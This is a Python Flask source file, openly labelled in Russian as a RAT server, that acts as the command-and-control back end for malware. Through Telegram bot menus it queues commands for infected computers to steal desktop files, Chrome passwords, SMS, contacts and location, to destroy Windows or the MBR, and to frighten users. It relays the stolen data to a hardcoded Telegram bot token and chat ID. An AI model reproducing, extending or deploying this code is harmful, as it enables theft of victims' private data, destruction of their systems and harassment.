import os
import time
import threading
import requests
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = '7798641801:AAHZWpVGv2YicowZaigNS9Q7jIHu9S3Jxaw'
CHAT_ID = '7803661441'

latest_command = {"cmd": "none", "params": ""}

print("✅ RAT сервер запущен", flush=True)

# ========== ОТПРАВКА СООБЩЕНИЙ ==========
def send_tg(text, keyboard=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': text}
        if keyboard:
            data['reply_markup'] = json.dumps(keyboard)
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки: {e}", flush=True)

# ========== КНОПКИ ==========
def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🕵️ КРАЖА ДАННЫХ", "callback_data": "menu_steal"}],
            [{"text": "💀 УНИЧТОЖЕНИЕ", "callback_data": "menu_kill"}],
            [{"text": "👻 УСТРАШЕНИЕ", "callback_data": "menu_scare"}],
            [{"text": "🎮 УПРАВЛЕНИЕ", "callback_data": "menu_control"}],
            [{"text": "ℹ️ СТАТУС", "callback_data": "status"}]
        ]
    }

def steal_menu():
    return {
        "inline_keyboard": [
            [{"text": "📁 ФАЙЛЫ ДЕСКТОПА", "callback_data": "steal_files"}],
            [{"text": "📸 ГАЛЕРЕЯ", "callback_data": "steal_gallery"}],
            [{"text": "🔑 ПАРОЛИ CHROME", "callback_data": "steal_passwords"}],
            [{"text": "📝 ЗАМЕТКИ", "callback_data": "steal_notes"}],
            [{"text": "💬 СМС", "callback_data": "steal_sms"}],
            [{"text": "📞 ЗВОНКИ", "callback_data": "steal_calls"}],
            [{"text": "👥 КОНТАКТЫ", "callback_data": "steal_contacts"}],
            [{"text": "📍 ЛОКАЦИЯ", "callback_data": "steal_location"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

def kill_menu():
    return {
        "inline_keyboard": [
            [{"text": "⏻ ВЫКЛЮЧИТЬ ПК", "callback_data": "shutdown"}],
            [{"text": "🔄 ПЕРЕЗАГРУЗИТЬ", "callback_data": "reboot"}],
            [{"text": "💀 УНИЧТОЖИТЬ WINDOWS", "callback_data": "destroy_windows"}],
            [{"text": "🧱 УНИЧТОЖИТЬ MBR", "callback_data": "destroy_mbr"}],
            [{"text": "🔒 ЗАБЛОКИРОВАТЬ ЭКРАН", "callback_data": "lock_screen"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

def scare_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔊 СТРАШНЫЙ ЗВУК", "callback_data": "scare_sound"}],
            [{"text": "🪟 20 ОКОН", "callback_data": "scare_windows"}],
            [{"text": "💀 ФЕЙК УДАЛЕНИЕ", "callback_data": "scare_delete"}],
            [{"text": "👻 ДЖАМПСКЕЙР", "callback_data": "scare_jump"}],
            [{"text": "💬 СПАМ СООБЩЕНИЯМИ", "callback_data": "scare_spam"}],
            [{"text": "🎵 RICKROLL", "callback_data": "scare_rick"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

def control_menu():
    return {
        "inline_keyboard": [
            [{"text": "🧮 КАЛЬКУЛЯТОР", "callback_data": "run_calc"}],
            [{"text": "📝 БЛОКНОТ", "callback_data": "run_notepad"}],
            [{"text": "💻 CMD", "callback_data": "run_cmd"}],
            [{"text": "🌐 CHROME", "callback_data": "run_chrome"}],
            [{"text": "🔊 ГРОМКОСТЬ +", "callback_data": "vol_up"}],
            [{"text": "🔉 ГРОМКОСТЬ -", "callback_data": "vol_down"}],
            [{"text": "🔇 ВЫКЛ ЗВУК", "callback_data": "vol_mute"}],
            [{"text": "◀️ НАЗАД", "callback_data": "back_main"}]
        ]
    }

# ========== ОБРАБОТЧИКИ ==========
def handle_callback(data):
    global latest_command
    
    if data == "back_main":
        send_tg("🤖 ГЛАВНОЕ МЕНЮ", main_menu())
    
    # МЕНЮ
    elif data == "menu_steal":
        send_tg("🕵️ КРАЖА ДАННЫХ", steal_menu())
    elif data == "menu_kill":
        send_tg("💀 УНИЧТОЖЕНИЕ", kill_menu())
    elif data == "menu_scare":
        send_tg("👻 УСТРАШЕНИЕ", scare_menu())
    elif data == "menu_control":
        send_tg("🎮 УПРАВЛЕНИЕ ПК", control_menu())
    
    # КРАЖА
    elif data == "steal_files":
        latest_command = {"cmd": "steal_files", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    elif data == "steal_gallery":
        latest_command = {"cmd": "steal_gallery", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    elif data == "steal_passwords":
        latest_command = {"cmd": "steal_passwords", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    elif data == "steal_notes":
        latest_command = {"cmd": "steal_notes", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    elif data == "steal_sms":
        latest_command = {"cmd": "steal_sms", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    elif data == "steal_calls":
        latest_command = {"cmd": "steal_calls", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    elif data == "steal_contacts":
        latest_command = {"cmd": "steal_contacts", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    elif data == "steal_location":
        latest_command = {"cmd": "steal_location", "params": ""}
        send_tg("✅ КОМАНДА ОТПРАВЛЕНА", main_menu())
    
    # УНИЧТОЖЕНИЕ
    elif data == "shutdown":
        latest_command = {"cmd": "shutdown", "params": ""}
        send_tg("⏻ ВЫКЛЮЧЕНИЕ", main_menu())
    elif data == "reboot":
        latest_command = {"cmd": "reboot", "params": ""}
        send_tg("🔄 ПЕРЕЗАГРУЗКА", main_menu())
    elif data == "destroy_windows":
        latest_command = {"cmd": "destroy_windows", "params": ""}
        send_tg("💀 УНИЧТОЖЕНИЕ WINDOWS", main_menu())
    elif data == "destroy_mbr":
        latest_command = {"cmd": "destroy_mbr", "params": ""}
        send_tg("🧱 УНИЧТОЖЕНИЕ MBR", main_menu())
    elif data == "lock_screen":
        latest_command = {"cmd": "lock_screen", "params": ""}
        send_tg("🔒 БЛОКИРОВКА ЭКРАНА", main_menu())
    
    # УСТРАШЕНИЕ
    elif data == "scare_sound":
        latest_command = {"cmd": "scare_sound", "params": ""}
        send_tg("🔊 СТРАШНЫЙ ЗВУК", main_menu())
    elif data == "scare_windows":
        latest_command = {"cmd": "scare_windows", "params": ""}
        send_tg("🪟 20 ОКОН", main_menu())
    elif data == "scare_delete":
        latest_command = {"cmd": "scare_delete", "params": ""}
        send_tg("💀 ФЕЙК УДАЛЕНИЕ", main_menu())
    elif data == "scare_jump":
        latest_command = {"cmd": "scare_jump", "params": ""}
        send_tg("👻 ДЖАМПСКЕЙР", main_menu())
    elif data == "scare_spam":
        latest_command = {"cmd": "scare_spam", "params": ""}
        send_tg("💬 СПАМ СООБЩЕНИЯМИ", main_menu())
    elif data == "scare_rick":
        latest_command = {"cmd": "scare_rick", "params": ""}
        send_tg("🎵 RICKROLL", main_menu())
    
    # УПРАВЛЕНИЕ
    elif data == "run_calc":
        latest_command = {"cmd": "run_calc", "params": ""}
        send_tg("🧮 ЗАПУСК КАЛЬКУЛЯТОРА", main_menu())
    elif data == "run_notepad":
        latest_command = {"cmd": "run_notepad", "params": ""}
        send_tg("📝 ЗАПУСК БЛОКНОТА", main_menu())
    elif data == "run_cmd":
        latest_command = {"cmd": "run_cmd", "params": ""}
        send_tg("💻 ЗАПУСК CMD", main_menu())
    elif data == "run_chrome":
        latest_command = {"cmd": "run_chrome", "params": ""}
        send_tg("🌐 ЗАПУСК CHROME", main_menu())
    elif data == "vol_up":
        latest_command = {"cmd": "vol_up", "params": ""}
        send_tg("🔊 ГРОМКОСТЬ +", main_menu())
    elif data == "vol_down":
        latest_command = {"cmd": "vol_down", "params": ""}
        send_tg("🔉 ГРОМКОСТЬ -", main_menu())
    elif data == "vol_mute":
        latest_command = {"cmd": "vol_mute", "params": ""}
        send_tg("🔇 ВЫКЛ ЗВУК", main_menu())
    
    elif data == "status":
        send_tg("✅ RAT СЕРВЕР РАБОТАЕТ", main_menu())

# ========== СЛУШАТЕЛЬ ==========
def listen():
    last_id = 0
    send_tg("✅ RAT СЕРВЕР ЗАПУЩЕН!")
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {'offset': last_id + 1, 'timeout': 10}
            r = requests.get(url, params=params, timeout=15).json()
            if r.get('ok'):
                for update in r['result']:
                    last_id = update['update_id']
                    if 'callback_query' in update:
                        handle_callback(update['callback_query']['data'])
                    elif 'message' in update:
                        text = update['message'].get('text', '')
                        if text == '/start':
                            send_tg("🤖 RAT АКТИВИРОВАН\nВыберите действие:", main_menu())
        except Exception as e:
            print(f"Ошибка: {e}", flush=True)
        time.sleep(1)

threading.Thread(target=listen, daemon=True).start()

# ========== API ==========
@app.route('/')
def home():
    return "✅ RAT сервер работает!", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    cmd = latest_command["cmd"]
    params = latest_command["params"]
    if cmd != "none":
        latest_command["cmd"] = "none"
        latest_command["params"] = ""
    return jsonify({"command": cmd, "params": params})

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.get_json()
    if data:
        send_tg(f"📱 {data.get('type', 'data')}:\n{data.get('content', '')[:3000]}")
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
